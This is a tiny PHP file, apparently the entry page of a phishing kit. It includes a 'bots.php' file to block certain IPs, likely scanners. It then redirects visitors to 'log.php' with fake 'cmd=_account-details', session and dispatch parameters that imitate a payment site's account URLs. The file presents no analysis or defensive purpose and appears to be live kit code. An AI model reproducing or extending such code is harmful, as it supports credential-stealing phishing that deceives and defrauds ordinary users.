<?php

include "bots.php";  //To Block Some IPs / you can block any IP

?>
<?php

header("location: log.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
exit;

?>